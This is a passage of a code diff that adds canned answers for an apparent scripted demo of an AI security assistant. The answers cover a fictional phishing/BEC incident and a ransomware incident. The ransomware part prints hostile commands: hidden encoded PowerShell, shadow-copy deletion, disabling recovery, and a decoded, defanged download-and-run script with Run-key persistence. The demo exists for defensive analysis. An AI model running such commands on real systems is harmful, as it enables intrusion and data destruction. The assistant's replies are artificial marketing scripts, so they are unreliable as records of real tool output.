+ steps:[["Understanding your prompt",""],["Looking up device FIN-LT-0342","Intune"],["Checking compliance &amp; configuration","Intune"],["Reviewing Defender for Endpoint alerts","Defender XDR"],["Generating response",""]],
+ blocks:[
+  {t:'p',h:`${G}Good news${X} – the device does <b>not</b> appear to be the entry point. This was an identity attack that never needed malware on the laptop.`},
+  {t:'table',head:['Check','Result'],rows:[
+   ['Compliance state',`${G}Compliant${X} (last check-in 08:55 today)`],
+   ['OS / patch level','Windows 11 23H2 – up to date'],
+   ['BitLocker / Secure Boot',`${G}Enabled${X} / ${G}Enabled${X}`],
+   ['Defender Antivirus','Real-time protection on · no detections in 30 days'],
+   ['Defender for Endpoint alerts',`${B}1 informational${X} – user browsed to a phishing URL (08:55)`],
+   ['Device risk score',`${G}Low${X}`]]},
+  {t:'p',h:`The only endpoint evidence is the <b>08:55 browser connection</b> to the phishing domain – consistent with the user clicking the link. I recommend a quick AV scan as hygiene, but no isolation is needed at this time.`}
+ ]},
+
+mitre:{
+ steps:[["Understanding your prompt",""],["Reading alert evidence for incident 4721","Defender XDR"],["Mapping behaviours to MITRE ATT&amp;CK","Defender Threat Intelligence"],["Generating response",""]],
+ blocks:[
+  {t:'p',h:`The incident maps to <b>7 ATT&amp;CK techniques</b> across 5 tactics:`},
+  {t:'table',head:['Tactic','Technique','Evidence'],rows:[
+   ['Initial Access','T1566.002 – Spearphishing Link','Remittance email with link to contoso-sharepoint-docs[.]com'],
+   ['Credential Access','T1557 – Adversary-in-the-Middle','Reverse-proxy login page relaying credentials and MFA'],
+   ['Defense Evasion','T1550.004 – Web Session Cookie','Token replayed from 185.220.101.47 without MFA prompt'],
+   ['Defense Evasion','T1564.008 – Email Hiding Rules','Inbox rule “.” moves mail to RSS Subscriptions'],
+   ['Collection','T1114.003 – Email Forwarding Rule','Forward to external proton[.]me address'],
+   ['Collection','T1530 – Data from Cloud Storage','23 files downloaded from Finance-Payments'],
+   ['Impact / Fraud','T1657 – Financial Theft','9 supplier bank-detail emails accessed (BEC intent)']]},
+  {t:'p',h:`Threat intelligence: the phishing kit and infrastructure overlap with a campaign tracked by Microsoft as <b>Storm-1167</b> (AiTM phishing kit used for BEC). Confidence: ${A}Medium${X}.`}
+ ]},
+
+remed:{
+ steps:[["Understanding your prompt",""],["Evaluating incident severity &amp; scope","Defender XDR"],["Building prioritised response plan",""],["Generating response",""]],
+ blocks:[
+  {t:'p',h:`Here is the recommended response, in priority order. Each action can be executed from here:`},
+  {t:'actions',items:[
+   ['Revoke all sessions &amp; refresh tokens','thandi.mokoena and pieter.vanwyk – kills the attacker\'s stolen token','Revoked 2 users\' sessions via Entra'],
+   ['Reset password &amp; require MFA re-registration','thandi.mokoena – confirmed compromised','Password reset + MFA re-registration enforced'],
+   ['Delete malicious inbox rule “.”','Removes forwarding to proton[.]me','Inbox rule removed · forwarding stopped'],
+   ['Block URL, domain &amp; sender','contoso-sharepoint-docs[.]com · vendor-payments[.]co · 185.220.101.47','3 indicators added (Block &amp; Warn) in Defender'],
+   ['Soft-delete phishing email from 37 mailboxes','Zero-hour auto purge + manual hunt','Removed 37 messages from mailboxes'],
+   ['Require compliant device &amp; token protection','Conditional Access policy for Finance group','CA policy created in report-only mode']]},
+  {t:'h',h:'Follow-up (next 24 hours)'},
+  {t:'ul',items:[
+   `Notify finance leadership: validate <b>any supplier bank-detail changes</b> from the last 7 days by phone.`,
+   `Review the 4 forwarded emails and contact affected suppliers if needed.`,
+   `Assess POPIA obligations – supplier personal information may have been accessed (Purview can scope this).`,
+   `Enable phishing-resistant MFA (FIDO2 / passkeys) for Finance.`]}
+ ]},
+
+exec:{
+ steps:[["Understanding your prompt",""],["Collecting incident timeline &amp; actions","Defender XDR"],["Drafting executive summary",""],["Generating response",""]],
+ blocks:[
+  {t:'h',h:'Executive summary – Incident 4721 (28 Oct 2026)'},
+  {t:'p',h:`<b>What happened:</b> A finance employee was targeted by a phishing email impersonating a supplier. The attacker captured her session, accessed her mailbox and set a hidden rule to forward payment-related emails to an external address. The aim was most likely to redirect supplier payments (business email compromise).`},
+  {t:'p',h:`<b>Impact:</b> 1 account compromised, 112 emails viewed, 23 files downloaded. 4 emails were forwarded externally. <b>No evidence of financial loss</b> or malware on devices.`},
+  {t:'p',h:`<b>Response:</b> Detected by Defender XDR at 09:14 and contained within 22 minutes: sessions revoked, password reset, malicious rule removed, domain and IP blocked, phishing email purged from 37 mailboxes.`},
+  {t:'p',h:`<b>Risk &amp; next steps:</b> Residual risk is ${A}Medium${X} until suppliers have verified any bank-detail changes. We recommend phishing-resistant MFA for Finance, token-protection Conditional Access, and a user awareness refresher.`},
+  {t:'p',h:`<b>Time saved:</b> Triage, scoping, hunting and reporting normally take an analyst 3–4 hours; with Security Copilot this took under <b>10 minutes</b>.`}
+ ]},
+
+help:{
+ steps:[["Understanding your prompt",""],["Generating response",""]],
+ blocks:[
+  {t:'p',h:`I'm <b>Microsoft Security Copilot</b> – a generative-AI assistant that helps security teams respond faster. I can work across Defender, Sentinel, Entra, Intune and Purview to:`},
+  {t:'ul',items:[`<b>Summarise incidents</b> and explain attack stories in plain language`,`<b>Write and run KQL</b> from natural language`,`<b>Analyse scripts, files and URLs</b>, and enrich with threat intelligence`,`<b>Assess device and identity risk</b> and recommend remediation`,`<b>Draft reports</b> for executives and auditors`]},
+  {t:'p',h:`Try: <i>“Summarize incident 4721”</i>.`}
+ ]},
+
+fall:{
+ steps:[["Understanding your prompt",""],["Searching connected sources","Defender XDR · Entra"],["Generating response",""]],
+ blocks:[
+  {t:'p',h:`I looked across the connected sources for “<b>__Q__</b>” in the context of incident <b>#4721</b> and found nothing additional beyond what's already in the investigation.`},
+  {t:'p',h:`In this demo environment I can go deeper on: the <b>incident summary</b>, <b>blast radius</b>, <b>sign-in activity</b>, <b>KQL hunting</b>, <b>device health (Intune)</b>, <b>MITRE ATT&amp;CK mapping</b>, <b>remediation</b> and an <b>executive summary</b>. Which would you like?`},
+  {t:'p',h:`As far as I know, I don't have that information. You would need to review your current policies and controls to confirm.`}
+ ]}
+};
+
+const ROUTES_P=[
+ [/exec|ciso|board|report|brief/i,'exec'],
+ [/remed|contain|respond|mitigat|fix|next step|action|isolate|revoke|block/i,'remed'],
+ [/mitre|att&?ck|technique|tactic|ttp/i,'mitre'],
+ [/intune|device|laptop|endpoint|compliance|malware/i,'device'],
+ [/kql|hunt|inbox rule|query|advanced hunting|forward/i,'kql'],
+ [/sign.?in|login|log-?on|entra|mfa|token|location|ip /i,'signin'],
+ [/blast|radius|impact|affected|who|scope|exposed|how many|recipient/i,'blast'],
+ [/summar|incident|4721|what happened|overview|explain|investigat/i,'summary'],
+ [/help|what can you|what is|who are you|hello|hi\b|capabilit/i,'help']
+];
+
+const GUIDE_P=[
+ ['Summarize incident 4721','Start here. Copilot turns 14 correlated alerts into a readable attack story.','“Instead of opening 14 alerts, I ask one question.”'],
+ ['What is the blast radius of this incident?','Shows who clicked, who is compromised and what data was exposed.','Highlight the third user who was blocked by Safe Links.'],
+ ['Show sign-in activity for thandi.mokoena@contoso.co.za','Impossible travel + MFA claim without prompt = token replay.','Explain AiTM in one sentence.'],
+ ['Write a KQL query to find inbox rules created by this user','Natural language to KQL, executed live in Advanced Hunting.','Great moment for junior analysts: no KQL knowledge needed.'],
+ ['Is her laptop compromised? Check Intune','Cross-product reasoning: Defender + Intune.','Shows Copilot ruling things out, saving unnecessary isolation.'],
+ ['Map this incident to MITRE ATT&CK','Instant mapping for reporting and detection engineering.','Useful for SOC maturity discussions.'],
+ ['Recommend remediation steps','Prioritised actions with Run buttons.','Click “Run” on each action live.'],
+ ['Give me an executive summary I can send to the CISO','Reporting in seconds. Close with time saved.','Land the ROI message.']
+];
+/* ===== Phishing: extra email-analysis answer ===== */
+KB_P.email={
+ steps:[["Understanding your prompt",""],["Retrieving message headers &amp; authentication results","Defender for Office 365"],["Detonating URL in sandbox","Defender XDR"],["Checking domain reputation &amp; age","Defender Threat Intelligence"],["Generating response",""]],
+ blocks:[
+  {t:'p',h:`I analysed the phishing message delivered to <b>thandi.mokoena@contoso.co.za</b> at 08:52. Verdict: ${R}Phish – AiTM credential harvesting${X} (confidence <b>High</b>).`},
+  {t:'table',head:['Check','Result','Assessment'],hl:[3,4],rows:[
+   ['Subject','Remittance advice – Invoice 88213','Urgent finance theme'],
+   ['Sender','billing@vendor-payments[.]co (display name “Vendor Payments”)',`${A}Look-alike${X} of known supplier <i>vendorpayments.co.za</i>`],
+   ['SPF / DKIM / DMARC','Pass / Pass / None',`${A}Passes for the attacker's own domain – not proof of legitimacy${X}`],
+   ['Domain age','Registered 6 days ago (privacy-protected)',`${R}Newly registered${X}`],
+   ['Reply-To','accounts@vendor-payments[.]co (matches sender)',`${G}Consistent${X}`],
+   ['Link','hxxps://contoso-sharepoint-docs[.]com/login?id=88213',`${R}Malicious${X} – reverse-proxy phishing page`],
+   ['Safe Links at click time (08:55)','Not flagged (URL was clean at delivery)',`${A}Weaponised after delivery${X}`]]},
+  {t:'h',h:'URL detonation'},
+  {t:'ul',items:[
+   `The page renders a pixel-perfect <i>“Sign in to your account”</i> Microsoft screen with the victim's tenant branding.`,
+   `Behind it, a <b>reverse proxy</b> forwards the credentials and MFA response to the real Microsoft login in real time and <b>captures the session cookie</b>.`,
+   `Defender Threat Intelligence: domain linked to <b>3 other phishing campaigns</b> this month; hosting provider flagged for bulletproof hosting.`]},
+  {t:'h',h:'Similar messages in the tenant'},
+  {t:'p',h:`<b>37 messages</b> from the same sender cluster reached 37 mailboxes between 08:49 and 09:03 (4 sender addresses, same URL). <b>34 are still in inboxes.</b> I recommend purging them and blocking the domain.`}
+ ]};
+FOLLOW_P.summary=["Analyze the phishing email","What is the blast radius of this incident?"];
+FOLLOW_P.email=["What is the blast radius of this incident?","Show sign-in activity for thandi.mokoena@contoso.co.za"];
+ROUTES_P.splice(2,0,[/email|header|spf|dkim|dmarc|url|link|detonat|attachment|sender|analy[sz]e the phish/i,'email']);
+GUIDE_P.splice(1,0,['Analyze the phishing email','Header authentication, domain age, and URL detonation in seconds.','“Notice it passes SPF and DKIM – that is why it was delivered.”']);
+
+/* ===== Scenario 2: Ransomware threat on a device ===== */
+const FOLLOW_R={
+ summary:["Show the attack timeline and process tree","Decode the PowerShell command"],
+ chain:["Decode the PowerShell command","Did the ransomware spread to other devices?"],
+ script:["What threat intelligence do we have on this payload?","Did the ransomware spread to other devices?"],
+ ti:["Did the ransomware spread to other devices?","Check the device security posture in Intune"],
+ scope:["Check the device security posture in Intune","Can we recover the encrypted files?"],
+ posture:["Can we recover the encrypted files?","Map this incident to MITRE ATT&CK"],
+ recover:["Map this incident to MITRE ATT&CK","How do we contain and remediate this?"],
+ mitre:["How do we contain and remediate this?"],
+ contain:["Give me an executive summary for the CISO"],
+ exec:["Summarize incident 5188"],
+ help:["Summarize incident 5188","Show the attack timeline and process tree"],
+ fall:["Summarize incident 5188","How do we contain and remediate this?"]
+};
+
+const KB_R={
+summary:{
+ steps:[["Understanding your prompt",""],["Retrieving incident 5188","Defender XDR"],["Correlating 9 alerts across 3 sources","Defender XDR"],["Checking automatic attack disruption status","Defender for Endpoint"],["Generating summary",""]],
+ blocks:[
+  {t:'p',h:`Incident <b>#5188</b> – <i>Ransomware activity detected on one device</i> – is ${R}High${X} severity. Status: ${G}Disrupted${X}. Defender's <b>automatic attack disruption</b> isolated the device and disabled the user account at <b>14:33 SAST</b>, <b>42 seconds</b> after file encryption began.`},
+  {t:'table',head:['Field','Value'],rows:[
+   ['Device','HR-LT-0117 (Windows 11 23H2) – <i>isolated</i>'],
+   ['User','sipho.nkosi@contoso.co.za (Human Resources) – <i>account disabled</i>'],
+   ['Ransomware stage','Encryption attempt – <b>41 local files</b> renamed to .locked'],
+   ['Spread','None detected – 2 SMB connection attempts to servers were blocked'],
+   ['Detection sources','Defender for Office 365 · Defender for Endpoint · Defender for Identity']]},
+  {t:'h',h:'Attack story'},
+  {t:'ol',items:[
+   `<b>14:02</b> – Sipho receives “<code class="i">CV – Senior Payroll Analyst</code>” with a macro-enabled attachment <code class="i">CV_T_Mahlangu.docm</code> from a free-mail address. It matched no known-bad signature.`,
+   `<b>14:06</b> – He opens it and clicks <i>Enable Content</i>. Word spawns a hidden <b>PowerShell</b> that downloads a payload (<code class="i">upd.exe</code>) – a command-and-control (C2) beacon.`,
+   `<b>14:19</b> – The beacon tries to read <b>LSASS memory</b> to steal credentials. ${G}Blocked${X} by the ASR rule <i>Block credential stealing from LSASS</i>.`,
+   `<b>14:24</b> – Hands-on-keyboard discovery: <i>Domain Admins</i> group enumeration and attempts to reach file server <b>JHB-FS-01</b> – blocked.`,
+   `<b>14:31</b> – The attacker deletes <b>shadow copies</b> and disables Windows recovery – a ransomware precursor.`,
+   `<b>14:32</b> – Encryption starts. <b>14:33</b> – Attack disruption contains the device and user. <b>41 files</b> affected; <b>0 on network shares</b>.`]},
+  {t:'p',h:`<b>Confidence: High.</b> A ransomware deployment was stopped mid-flight. Let me show you the process tree.`}
+ ]},
+
+chain:{
+ steps:[["Understanding your prompt",""],["Reading device timeline for HR-LT-0117","Defender for Endpoint"],["Building process tree","Defender for Endpoint"],["Generating response",""]],
+ blocks:[
+  {t:'p',h:`This is the process tree reconstructed from Defender for Endpoint. Note how a <b>Word document</b> became the parent of everything that followed:`},
+  {t:'code',label:'Process tree · HR-LT-0117 · 28 Oct 2026',
+   h:`<span class="kw">WINWORD.EXE</span>  CV_T_Mahlangu.docm                          14:06:12
+└─ <span class="st">powershell.exe</span> -nop -w hidden -enc JABzAD0A…          14:06:15   <span class="cm">← macro child process</span>
+   └─ <span class="st">upd.exe</span> (%APPDATA%\\Microsoft\\upd.exe)              14:06:31   <span class="cm">← C2 beacon to 45.138.xx.xx:443</span>
+      ├─ <span class="kw">rundll32.exe</span> → lsass.exe memory read            14:19:03   <span class="cm">[ASR – BLOCKED]</span>
+      ├─ <span class="kw">cmd.exe</span> /c net group "Domain Admins" /domain    14:24:40   <span class="cm">[Discovery]</span>
+      ├─ <span class="st">vssadmin.exe</span> delete shadows /all /quiet         14:31:08   <span class="cm">[ALERT – inhibit recovery]</span>
+      ├─ <span class="st">bcdedit.exe</span> /set {default} recoveryenabled No   14:31:11   <span class="cm">[ALERT]</span>
+      └─ <span class="st">locker.exe</span> → *.locked (41 files)                14:32:20   <span class="cm">[RANSOMWARE – DISRUPTED 14:33:02]</span>`,
+   raw:`WINWORD.EXE  CV_T_Mahlangu.docm                          14:06:12
+ powershell.exe -nop -w hidden -enc JABzAD0A...            14:06:15
+  upd.exe (%APPDATA%\\Microsoft\\upd.exe)                   14:06:31
+   rundll32.exe -> lsass.exe memory read                   14:19:03 [ASR BLOCKED]
+   cmd.exe /c net group "Domain Admins" /domain            14:24:40
+   vssadmin.exe delete shadows /all /quiet                 14:31:08
+   bcdedit.exe /set {default} recoveryenabled No           14:31:11
+   locker.exe -> *.locked (41 files)                       14:32:20 [DISRUPTED 14:33:02]`},
+  {t:'ul',items:[
+   `<b>Dwell time:</b> 26 minutes from macro execution to encryption – quick, typical of a hands-on-keyboard ransomware operator.`,
+   `<b>Two defences worked:</b> the LSASS ASR rule and automatic attack disruption.`,
+   `<b>One gap:</b> the Office rule <i>Block child processes</i> was only in <b>audit</b> mode – otherwise stage 2 would never have started.`]}
+ ]},
+
+script:{
+ steps:[["Understanding your prompt",""],["Retrieving the PowerShell command line","Defender for Endpoint"],["Decoding Base64 &amp; de-obfuscating","Security Copilot"],["Enriching URL reputation","Defender Threat Intelligence"],["Generating response",""]],
+ blocks:[
+  {t:'p',h:`The command line was Base64-encoded (UTF-16LE) to hide its intent. I decoded it. Here is a <b>sanitised, defanged</b> version:`},
+  {t:'code',label:'Decoded PowerShell · defanged for demo',
+   h:`<span class="cm"># Stage 1 – download and run the payload</span>
+<span class="fn">$u</span> = <span class="st">'hxxps://cdn-update-service[.]top/a.bin'</span>
+<span class="fn">$p</span> = <span class="st">"$env:APPDATA\\Microsoft\\upd.exe"</span>
+(<span class="kw">New-Object</span> Net.WebClient).DownloadFile(<span class="fn">$u</span>,<span class="fn">$p</span>)
+<span class="kw">Start-Process</span> <span class="fn">$p</span> -WindowStyle Hidden
+
+<span class="cm"># Persistence – masquerades as a OneDrive updater</span>
+<span class="kw">reg add</span> HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v OneDriveUpdate /d <span class="fn">$p</span>`,
+   raw:`$u = 'hxxps://cdn-update-service[.]top/a.bin'
+$p = "$env:APPDATA\\Microsoft\\upd.exe"
+(New-Object Net.WebClient).DownloadFile($u,$p)
+Start-Process $p -WindowStyle Hidden
+reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v OneDriveUpdate /d $p`},
+  {t:'h',h:'What it does'},
+  {t:'ol',items:[
+   `<b>Downloads</b> an executable from a newly registered <code class="i">.top</code> domain (registered 3 days ago).`,
+   `<b>Executes it hidden</b> from the user profile folder – a location where legitimate software rarely runs.`,
+   `<b>Persists</b> through a Run key named like OneDrive so it survives a reboot and looks normal to the user.`]},
+  {t:'p',h:`${R}Malicious${X} – high confidence. Defender Threat Intelligence flags the domain and the downloaded file.`}
+ ]},
+
+ti:{
+ steps:[["Understanding your prompt",""],["Querying file, URL &amp; IP reputation","Defender Threat Intelligence"],["Checking campaign overlap","Defender Threat Intelligence"],["Generating response",""]],
+ blocks:[
+  {t:'p',h:`Here is what Defender Threat Intelligence knows about the indicators in this incident:`},
+  {t:'table',head:['Indicator','Type','Reputation','Notes'],hl:[0,1,2],rows:[
+   ['upd.exe · SHA-256 7c4e…a91b','File',`${R}Malicious${X}`,'C2 beacon; first seen 5 days ago; 212 detections in other tenants'],
+   ['cdn-update-service[.]top','Domain',`${R}Malicious${X}`,'Registered 3 days ago; hosts payload staging'],
+   ['45.138.xx.xx:443','C2 IP',`${R}Malicious${X}`,'Beacon check-in every 60 s with jitter'],
+   ['talent-hub[.]biz','Sender domain',`${A}Suspicious${X}`,'Used in 14 “CV” phishing campaigns this month'],
+   ['CV_T_Mahlangu.docm','Attachment',`${R}Malicious${X}`,'Macro-enabled; delivery vehicle']]},
+  {t:'p',h:`<b>Assessment:</b> The tooling and behaviour (macro → beacon → LSASS → shadow-copy deletion → encryption) match <b>hands-on-keyboard ransomware affiliate</b> activity, where attackers usually exfiltrate data before encrypting (<i>double extortion</i>). Attribution to a named group: ${A}Medium confidence${X}.`},
+  {t:'p',h:`${A}Check next${X} We should verify whether any data left the device before 14:33. I found <b>no large outbound transfers</b> to the C2 IP, only small beacon traffic (~18 KB).`}
+ ]},
+
+scope:{
+ steps:[["Understanding your prompt",""],["Finding other recipients of the attachment","Defender for Office 365"],["Hunting for the same hashes &amp; C2 traffic","Defender XDR"],["Reviewing SMB / lateral movement","Defender for Identity"],["Generating response",""]],
+ blocks:[
+  {t:'p',h:`${G}No spread detected.${X} The ransomware stayed on HR-LT-0117. Here is how I checked:`},
+  {t:'table',head:['Check','Result'],rows:[
+   ['Recipients of the same email','6 HR mailboxes · <b>2 opened</b> the attachment (Sipho and Nomsa)'],
+   ['Second opener: nomsa.dube · HR-LT-0121',`${G}Macro blocked${X} by the Intune “block macros from the internet” policy – no execution`],
+   ['Hash &amp; C2 hunt (last 7 days)','upd.exe / 45.138.xx.xx seen on <b>1 device only</b>'],
+   ['Lateral movement','2 SMB sessions to JHB-FS-01 and JHB-DC-01 – both <b>blocked</b> (credential theft failed)'],
+   ['File-server activity','No mass renames or encryption on any network share'],
+   ['Domain Admin / privileged accounts','No sign-ins from HR-LT-0117 with privileged credentials']]},
+  {t:'p',h:`Because LSASS access was blocked, the attacker never obtained domain credentials – which is what prevented a far larger incident. I still recommend <b>resetting Sipho's credentials</b> and checking Nomsa's device for macro-execution attempts.`}
+ ]},
+
+posture:{
+ steps:[["Understanding your prompt",""],["Reading device configuration","Intune"],["Evaluating ASR &amp; Defender settings","Intune · Defender for Endpoint"],["Comparing with security baseline","Intune"],["Generating response",""]],
+ blocks:[
+  {t:'p',h:`Device <b>HR-LT-0117</b> posture before the attack. Most protections were healthy, but one gap mattered:`},
+  {t:'table',head:['Control','State','Impact'],hl:[2],rows:[
+   ['ASR: Block credential stealing from LSASS',`${G}Block${X}`,'Stopped credential theft'],
+   ['ASR: Block Office apps from creating child processes',`${A}Audit only${X}`,`${R}Gap${X} – allowed Word to launch PowerShell`],
+   ['ASR: Block executable content from email &amp; webmail',`${G}Block${X}`,'—'],
+   ['Controlled folder access',`${G}Enabled${X}`,'Limited encryption to 41 files outside protected folders'],
+   ['Tamper protection',`${G}On${X}`,'Attacker could not disable Defender'],
+   ['Office macros from the internet',`${A}Allowed for HR group${X}`,`${R}Gap${X} – exempted for recruitment`],
+   ['BitLocker / Secure Boot',`${G}Enabled${X} / ${G}Enabled${X}`,'—']]},
+  {t:'p',h:`<b>Recommendation:</b> switch the Office child-process rule from <b>audit to block</b> for all users, and remove the macro exemption for HR – recruiters should receive CVs through a safe channel (PDF or sandboxed viewer).`}
+ ]},
+
+recover:{
+ steps:[["Understanding your prompt",""],["Listing affected files","Defender for Endpoint"],["Checking OneDrive version history","Microsoft 365"],["Checking backup &amp; shadow-copy status","Intune · Azure Backup"],["Generating response",""]],
+ blocks:[
+  {t:'p',h:`${G}Yes – recovery is possible with no ransom discussion.${X} Here is the picture:`},
+  {t:'table',head:['Source','Status','Result'],rows:[
+   ['OneDrive Known Folder Move (Documents, Desktop)',`${G}Synced${X}`,'<b>38 of 41</b> files have clean versions from before 14:06'],
+   ['Downloads folder (not synced)',`${A}Local only${X}`,'<b>3 files</b> need to be re-obtained from source'],
+   ['Local shadow copies',`${R}Deleted${X}`,'Removed by the attacker at 14:31'],
+   ['Network file shares','Not affected','No restore needed']]},
+  {t:'ul',items:[
+   `<b>Do not restore onto this device</b> – it is compromised. Re-image first, then let OneDrive re-sync.`,
+   `Use <i>Restore your OneDrive</i> to roll back to <b>14:00 today</b>.`,
+   `Recommended long-term: extend Known Folder Move to Downloads and enable immutable backups.`]},
+  {t:'actions',items:[
+   ['Restore OneDrive to 14:00 today','sipho.nkosi · 38 files','OneDrive restore to 14:00 started (38 files)']]}
+ ]},
+
+mitre:{
+ steps:[["Understanding your prompt",""],["Reading alert evidence for incident 5188","Defender XDR"],["Mapping behaviours to MITRE ATT&amp;CK","Defender Threat Intelligence"],["Generating response",""]],
+ blocks:[
+  {t:'p',h:`The incident maps to <b>10 ATT&amp;CK techniques</b> across 8 tactics:`},
+  {t:'table',head:['Tactic','Technique','Evidence'],rows:[
+   ['Initial Access','T1566.001 – Spearphishing Attachment','CV_T_Mahlangu.docm'],
+   ['Execution','T1204.002 – User Execution: Malicious File','User enabled macros'],
+   ['Execution','T1059.001 – PowerShell','Hidden, Base64-encoded command'],
+   ['Command &amp; Control','T1105 – Ingress Tool Transfer','upd.exe downloaded from .top domain'],
+   ['Persistence','T1547.001 – Registry Run Keys','OneDriveUpdate Run key'],
+   ['Credential Access','T1003.001 – LSASS Memory','Blocked by ASR rule'],
+   ['Discovery','T1087.002 / T1069.002 – Domain Account &amp; Group Discovery','net group "Domain Admins"'],
+   ['Lateral Movement','T1021.002 – SMB / Admin Shares','Blocked connections to JHB-FS-01 / JHB-DC-01'],
+   ['Impact','T1490 – Inhibit System Recovery','vssadmin delete shadows; bcdedit recoveryenabled No'],
+   ['Impact','T1486 – Data Encrypted for Impact','41 files renamed .locked']]},
+  {t:'p',h:`Detection coverage: <b>7 of 10</b> techniques were detected or blocked automatically. The 3 gaps are in the initial access and execution phase (see the posture findings).`}
+ ]},
+
+contain:{
+ steps:[["Understanding your prompt",""],["Evaluating incident status &amp; scope","Defender XDR"],["Building containment &amp; recovery plan",""],["Generating response",""]],
+ blocks:[
+  {t:'p',h:`Defender already contained the attack automatically. Here are the remaining steps, in priority order. Each can be run from here:`},
+  {t:'actions',items:[
+   ['Keep HR-LT-0117 isolated &amp; run full AV scan','Automatic isolation is active – confirm and collect investigation package','Device kept isolated · investigation package collected'],
+   ['Reset password &amp; revoke sessions for sipho.nkosi','Account was disabled by attack disruption; re-enable only after reset','Password reset · all sessions revoked'],
+   ['Block indicators in Defender','cdn-update-service[.]top · 45.138.xx.xx · file hash · talent-hub[.]biz','4 indicators added (Block &amp; Remediate)'],
+   ['Purge the phishing email from 6 mailboxes','Soft-delete CV_T_Mahlangu.docm message','Removed 6 messages from mailboxes'],
+   ['Wipe &amp; re-image HR-LT-0117 via Intune','Rebuild with Autopilot after evidence is collected','Intune wipe + Autopilot re-provisioning queued'],
+   ['Switch ASR “Office child processes” to Block','All Windows devices · removes the HR macro exemption','ASR rule set to Block for 1,204 devices'],
+   ['Restore OneDrive to 14:00 today','sipho.nkosi · 38 files','OneDrive restore to 14:00 started (38 files)']]},
+  {t:'h',h:'Follow-up (next 7 days)'},
+  {t:'ul',items:[
+   `Hunt for the same hash and C2 IP across all tenants and subsidiaries.`,
+   `Review Nomsa Dube's device – macro was blocked but check for any other attempts.`,
+   `Run a ransomware tabletop exercise with HR and Finance.`,
+   `Brief leadership: no ransom contact, no data loss expected, no evidence of data exfiltration.`]}
+ ]},
+
+exec:{
+ steps:[["Understanding your prompt",""],["Collecting incident timeline &amp; actions","Defender XDR"],["Drafting executive summary",""],["Generating response",""]],
+ blocks:[
+  {t:'h',h:'Executive summary – Incident 5188 (28 Oct 2026)'},
+  {t:'p',h:`<b>What happened:</b> An HR employee opened a fake CV containing a malicious macro. It installed a remote-access tool, attempted to steal credentials, deleted backup shadow copies and started encrypting files – the classic steps before a ransomware attack.`},
+  {t:'p',h:`<b>Outcome:</b> Automatic attack disruption stopped the attack <b>42 seconds after encryption began</b>. Only <b>41 files on one laptop</b> were affected. <b>38 can be restored from OneDrive</b>; 3 need to be re-obtained. <b>No network shares, servers or other users were affected.</b> No ransom is required.`},
+  {t:'p',h:`<b>Why it didn't get worse:</b> Credential-theft protection (ASR), tamper protection, and automatic isolation worked as designed.`},
+  {t:'p',h:`<b>Risk &amp; next steps:</b> Residual risk is ${A}Low${X} once the device is re-imaged. Two control gaps need fixing: <b>Office child-process blocking</b> (audit mode) and the <b>macro exemption for HR</b>. We also recommend extending cloud backup to Downloads and a ransomware tabletop exercise.`},
+  {t:'p',h:`<b>Time saved:</b> Investigation, scoping, decoding and reporting normally take an analyst half a day; with Security Copilot this took about <b>10 minutes</b>.`}
+ ]},
+
+help:{
+ steps:[["Understanding your prompt",""],["Generating response",""]],
+ blocks:[
+  {t:'p',h:`I'm <b>Microsoft Security Copilot</b>. For this ransomware incident I can help you:`},
+  {t:'ul',items:[`<b>Reconstruct the attack</b> – timeline and process tree`,`<b>Decode scripts</b> like the PowerShell command that started it`,`<b>Check scope</b> – did it spread to other devices or servers?`,`<b>Assess posture</b> and recoverability, and <b>contain</b> the device`,`<b>Write the executive summary</b>`]},
+  {t:'p',h:`Try: <i>“Summarize incident 5188”</i>.`}
+ ]},
+
+fall:{
+ steps:[["Understanding your prompt",""],["Searching connected sources","Defender XDR · Intune"],["Generating response",""]],
+ blocks:[
+  {t:'p',h:`I searched the connected sources for “<b>__Q__</b>” in the context of incident <b>#5188</b> and found nothing additional beyond what's in the investigation.`},
+  {t:'p',h:`In this demo I can go deeper on: <b>incident summary</b>, <b>attack timeline</b>, <b>decoding the PowerShell</b>, <b>threat intelligence</b>, <b>spread to other devices</b>, <b>device posture</b>, <b>file recovery</b>, <b>MITRE mapping</b>, <b>containment</b> and an <b>executive summary</b>.`}
+ ]}
+};
+
+const ROUTES_R=[
+ [/\bexec(utive)?\b|ciso|board|report|brief/i,'exec'],
+ [/att&?ck|tactic|technique|ttp|mitre/i,'mitre'],
+ [/isolat|contain|remed|respond|mitigat|fix|next step|action|stop|block|clean/i,'contain'],
+ [/backup|restore|recover|shadow|vss|encrypt|onedrive|files/i,'recover'],
+ [/script|powershell|decode|base64|obfus|macro|command/i,'script'],
+ [/actor|intel|family|hash|ioc|indicator|campaign|attribut|group|c2|domain/i,'ti'],
+ [/intune|posture|asr|policy|config|compliance|harden|attack surface/i,'posture'],
+ [/other device|lateral|spread|blast|radius|scope|affected|server|share|who|how many|mailbox|recipient/i,'scope'],
+ [/process|tree|timeline|chain|sequence|how did|kill chain|execution|attack path/i,'chain'],
+ [/summar|incident|5188|what happened|overview|ransom|threat|alert|explain|investigat/i,'summary'],
+ [/help|what can you|what is|who are you|hello|hi\b|capabilit/i,'help']
+];
+const GUIDE_R=[
+ ['Summarize incident 5188','A ransomware attack stopped in flight. 9 alerts become one story.','“This is the incident you want to see at 14:33 – and it was stopped automatically.”'],
+ ['Show the attack timeline and process tree','The Word → PowerShell → beacon → encryption chain.','Point out the ASR block on LSASS and the audit-mode gap.'],
+ ['Decode the PowerShell command','Copilot de-obfuscates a Base64 command in seconds.','Great for junior analysts who cannot read encoded PowerShell.'],
+ ['What threat intelligence do we have on this payload?','File, domain and C2 reputation with campaign overlap.','Mention double-extortion risk and the exfiltration check.'],
+ ['Did the ransomware spread to other devices?','Hunts across devices, SMB sessions and mailboxes.','Highlight that the second HR user was protected by Intune policy.'],
+ ['Check the device security posture in Intune','Reveals the exact control gaps that let it start.','Audit-mode ASR rule is a relatable real-world finding.'],
+ ['Can we recover the encrypted files?','OneDrive restore point and backup coverage.','“No ransom conversation needed.”'],
+ ['How do we contain and remediate this?','Prioritised actions with Run buttons.','Click “Run” on several actions live.'],
+ ['Give me an executive summary for the CISO','Board-ready summary with time saved.','Land the ROI message.']
+];
+
+/* ===== scenarios ===== */
+const SC={
+ phish:{name:'Phishing incident',tag:'Incident #4721 · Phishing / BEC',pill:'Incident #4721 · Phishing / BEC',
+  KB:KB_P,FOLLOW:FOLLOW_P,ROUTES:ROUTES_P,GUIDE:GUIDE_P,
